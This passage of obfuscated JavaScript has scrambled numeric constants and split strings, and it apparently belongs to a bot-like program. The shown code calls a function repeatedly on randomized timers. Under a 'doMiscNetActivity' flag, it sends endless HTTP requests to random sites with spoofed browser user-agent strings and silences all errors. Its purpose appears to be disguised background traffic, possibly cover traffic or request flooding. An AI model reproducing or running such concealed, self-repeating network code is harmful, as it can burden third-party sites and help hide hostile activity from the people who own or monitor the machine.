      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1c8d + -0x1ff2 + 0x11 * 0x38f; k < -0x1e23 + 0x1d48 + -0x1 * -0xdf; k++)
    setTimeout(f, (0x1c32d + -0xb029 * 0x2 + 0x1 * 0x8785) * k * getRandomInt(-0x1 * -0x2359 + 0x2 * 0x588 + -0x2e68, -0x23f6 + 0x2187 * 0x1 + 0x272));
  setInterval(() => {
    f();
    for (let l = -0xa36 * -0x1 + -0x25d9 * 0x1 + 0x1ba3; l < 0x597 + 0x2 * 0xd01 + 0x2df * -0xb; l++)
      setTimeout(f, (-0x848 + -0x50c3 + 0x1436b) * l * getRandomInt(0x4fd * -0x5 + 0x1e72 + -0x580 * 0x1, -0x8a5 + 0x9a6 + -0xfe));
  }, 0x218b08 + -0x1f366 * -0x28 + 0xb5418 * -0x5);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x85 * 0x2 + -0x9 * -0x313 + -0x1 * 0x15d) * getRandomInt(-0x1522 + -0x17ef + 0x2d12, 0x9 * 0x34 + -0x1f0e + 0x1d3f));
}, -0x1 * -0x1921 + -0x151e + -0x135 * 0x3);